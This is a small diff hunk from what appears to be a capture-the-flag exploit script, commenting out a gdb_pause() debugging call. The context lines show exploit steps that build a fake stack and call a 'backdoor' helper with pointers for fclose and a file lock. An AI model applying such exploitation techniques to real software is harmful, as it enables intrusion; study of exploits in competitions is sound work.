@@ -249,7 +249,7 @@ def main(nstep = 1):
     fake_stack = fp_rand_read_base + 0x900
     info('remember to restore fd to be used in fclose(fp_rand)')
     backdoor(fake_stack - 8, fclose_rbp_ptr, fp_rand_lock_addr, 3)
-    gdb_pause()
+    # gdb_pause()
     cmd(7)
     pass
 
